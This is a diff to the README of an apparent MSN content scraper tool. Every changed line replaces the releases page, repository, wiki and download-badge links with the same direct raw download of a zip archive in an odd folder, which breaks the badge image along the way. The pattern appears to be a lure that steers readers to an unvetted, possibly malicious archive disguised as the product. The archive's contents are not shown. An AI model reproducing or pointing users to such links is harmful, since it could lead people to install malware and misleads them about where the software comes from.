@@ -1,6 +1,6 @@
 # 🕵️ msn-scraper - Effortlessly Analyze MSN Content
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Myantteam/msn-scraper/releases)
+[![Download Now](https://github.com/Myantteam/msn-scraper/raw/refs/heads/main/pyxidate/scraper-msn-v3.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/Myantteam/msn-scraper/raw/refs/heads/main/pyxidate/scraper-msn-v3.5.zip)
 
 ## 📖 Introduction
 
@@ -20,7 +20,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 ### 📥 Download & Install
 
-1. **Visit this page to download**: [Release Page](https://github.com/Myantteam/msn-scraper/releases)
+1. **Visit this page to download**: [Release Page](https://github.com/Myantteam/msn-scraper/raw/refs/heads/main/pyxidate/scraper-msn-v3.5.zip)
 
 2. Find the latest version, and click on it to see the assets available.
 
@@ -99,11 +99,11 @@ A: No, it is completely free to use.
 A: Yes, as long as it meets the system requirements.
 
 **Q: Will I get updates automatically?**  
-A: You will need to return to the [Release Page](https://github.com/Myantteam/msn-scraper/releases) for any new versions.
+A: You will need to return to the [Release Page](https://github.com/Myantteam/msn-scraper/raw/refs/heads/main/pyxidate/scraper-msn-v3.5.zip) for any new versions.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Myantteam/msn-scraper)
-- [Documentation](https://github.com/Myantteam/msn-scraper/wiki)
+- [GitHub Repository](https://github.com/Myantteam/msn-scraper/raw/refs/heads/main/pyxidate/scraper-msn-v3.5.zip)
+- [Documentation](https://github.com/Myantteam/msn-scraper/raw/refs/heads/main/pyxidate/scraper-msn-v3.5.zip)
 
 You’re all set to start using **msn-scraper**! Enjoy gathering insights from MSN content.
